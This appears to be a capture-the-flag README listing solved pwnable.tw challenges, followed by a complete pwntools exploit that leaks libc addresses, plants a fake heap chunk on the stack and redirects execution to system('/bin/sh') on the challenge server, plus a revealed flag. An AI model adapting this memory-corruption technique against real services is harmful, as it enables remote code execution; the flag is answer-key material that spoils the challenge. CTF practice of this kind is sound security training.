# PWNABLE.TW

>Author: Nigma

- #### Link pwnable.tw profile: [https://pwnable.tw/user/30002](https://pwnable.tw/user/30002)

## List challenge solved

|    Số thứ tự    |  Thử thách  | Writeup                                                       | Hoàn thiện |
| :-------------: | :---------: | :-----------------------------------------------------------: |:----------:|
|       01        |    Start    | [Start](./1_Start)                                            |✅         |         
|       02        |     orw     | [orw](./2_orw)                                                |✅         |
|       03        |CVE-2018-1160| [CVE-2018-1160](./3_CVE-2018-1160)                            |❌         |
|       04        |    calc     | [calc](./4_calc)                                              |✅         |
|       05        |    3x17     | [3x17](./5_3x17)                                              |✅         |
|       06        |  dubblesort | [dubblesort](./6_dubblesort)                                  |✅         |
|       07        |  hacknote   | [hacknote](./7_hacknote)                                      |✅         |
|       08        |Silver Bullet| [Silver Bullet](https://github.com/NigmaZ/Pwnable/tree/main/Pwnable.tw/8_Silver%20Bullet)                            |✅         |
|       09        |  applestore | [applestore](./9_applestore)                                  |✅         |
|       10        |   Re-alloc  | [Re-alloc](./10_Re-alloc)                                     |❌         |


```python
#!/usr/bin/env python3
from pwn import *
p = remote('chall.pwnable.tw', '10204')
# FLAG{Wh4t_1s_y0ur_sp1r1t_1n_pWn}

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
# context.update(binary=elf, log_level='DEBUG')
# p = elf.process()
# gdb.attach(p, '''
#     b *survey+447
# ''')

def comment(name, age, cause, cmt):
	print(p.recvuntil(b'name: '))
	p.sendline(name)
	print(p.recvuntil(b'age: '))
	p.sendline(str(age).encode())
	print(p.recvuntil(b'movie? '))
	p.sendline(cause)
	print(p.recvuntil(b'comment: '))
	p.sendline(cmt)
	return

# leak - use cause | read not insert NULL into last string and printf => leak libc
name = b'A' * 16
age = 23
cause = b'B' * 79
cmt = b'C' * 59
comment(name, age, cause, cmt)

p.recvuntil(b'BBB\n')
leak = p.recv(12)
rsp = u32(leak[0:4]) - 0x118
elf.symbols['main'] = u32(leak[4:8]) - 51  
libc.address = u32(leak[8:12]) - 0x1b0d60
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

log.info('rsp:               ' + hex(rsp))
log.info('ELF base address:  ' + hex(elf.address))
log.info('LIBC base address: ' + hex(libc.address))
log.info('system address:    ' + hex(system))
log.info('`/bin/sh` address: ' + hex(binsh))

print(p.recvuntil(b'<y/n>: '))
p.sendline(b'y')   

# get cnt -> three digits
name = b'D' * 16
age = 23
cause = b'E' * 16
cmt = b'F' * 16
for i in range(9):
	comment(name, age, cause, cmt)
	print(p.recvuntil(b'<y/n>: '))
	p.sendline(b'y')   

for i in range(90):
	print(p.recvuntil(b'age: '))
	p.sendline(str(age).encode())
	print(p.recvuntil(b'movie? '))
	p.sendline(cause)
	print(p.recvuntil(b'<y/n>: '))
	p.sendline(b'y')   


# gdb.attach(p, '''
#     b *survey+447
# ''')

############# get shell ###########
name = b'G' * 16
age = 23
print(p.recvuntil(b'name: '))
p.sendline(name)
print(p.recvuntil(b'age: '))
p.sendline(str(age).encode())

# fake chunk in cause address 
rbp = rsp + 0x118 - 0x20
cause_addr = rbp - 0x50 
log.info('rbp:                                  ' + hex(rbp))
log.info('cause address in stack:               ' + hex(cause_addr))
cause = p32(0) + p32(0x41)
cause += b'A' * 0x38
cause += p32(0) + p32(0x11)
print(p.recvuntil(b'movie? '))
p.sendline(cause)

# fake pointer *name => cause address
cmt = b'I' * 80
cmt += p32(1) + p32(cause_addr + 8)
print(p.recvuntil(b'comment: '))
p.send(cmt)
print(p.recvuntil(b'<y/n>: '))
p.sendline(b'y')   

# malloc name return pointer in cause stack addr [rbp - 0x50] and read 0x6e => RIP control
name = b'A' * 0x48 + b'BBBB'
name += p32(system)
name += p32(0)
name += p32(binsh)
age = 23
cause = b'E' * 16
cmt = b'F' * 16

comment(name, age, cause, cmt)
print(p.recvuntil(b'<y/n>: '))
p.sendline(b'n')   


p.interactive()
```
